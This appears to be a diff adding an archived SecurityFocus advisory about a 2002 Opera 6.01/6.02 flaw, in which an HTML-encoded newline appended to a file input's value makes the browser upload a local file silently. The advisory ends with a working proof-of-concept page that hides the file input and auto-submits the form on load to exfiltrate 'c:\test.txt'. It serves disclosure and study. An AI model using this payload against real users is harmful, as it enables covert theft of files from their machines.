@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/4834/info
+
+A vulnerability has been reported in Opera 6.01/6.02. The vulnerability is related to handling of the 'file' HTML input-type. It is possible for a server to set the file value, while fooling Opera into thinking no file has been specified. This is possible if the filename is appended with the string "&#10;". This HTML-encoded newline character will cause the browser to believe that no value has been set. Consequently, the form will be submitted and the specified file will be uploaded to the server. This may occur without knowledge or consent of the victim user.
+
+Exploitation of this vulnerability allows for malicious webmasters to obtain arbitrary files from client systems. 
+
+<body onload="document.secForm.submit()">
+<form method="post" enctype="multipart/form-data" action="recFile.php"
+name="secForm">
+<input type="file" name="expFile" value="c:\test.txt&#10;"
+style="visibility:hidden">
+</form>
+</body> 
